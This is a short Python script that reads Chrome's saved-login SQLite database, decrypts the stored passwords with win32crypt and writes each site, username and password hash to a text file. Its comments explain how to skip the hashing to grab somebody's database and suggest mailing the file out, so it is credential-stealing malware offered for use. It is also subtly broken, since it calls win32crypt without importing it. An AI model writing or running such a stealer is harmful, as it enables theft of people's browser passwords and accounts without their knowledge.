#!/usr/bin/env python
from os import getenv
import sqlite3
import hashlib

conn = sqlite3.connect(getenv("APPDATA")+r"\..\Local\Google\Chrome\User Data\Default\Login Data")
connection = conn.cursor()
conn.execute("PRAGMA busy_timeout = 300000")
connection.execute('Select action_url, username_value, password_value FROM logins')

file = open("Chromepass.txt", "a+")
file.write("Chrome Saved Passwords\n")

for result in connection.fetchall():
        #If you want to use this script to just grab somebody's sqlite3 db then just remove the hashing technique

        password = win32crypt.CryptUnprotectData(result[2],None,None,None,0)[1]
        hashobject = hashlib.sha512(str(password).encode('utf-8'))

        websiteurl = result[0]
        username = result[1]

        file.write('\n Website:' + websiteurl)
        file.write('\n Username:' + username)
        file.write('\n Hashed Password:' + str(hashobject.hexdigest()))

### You can call the mail script here to send it to your email somwhere. 
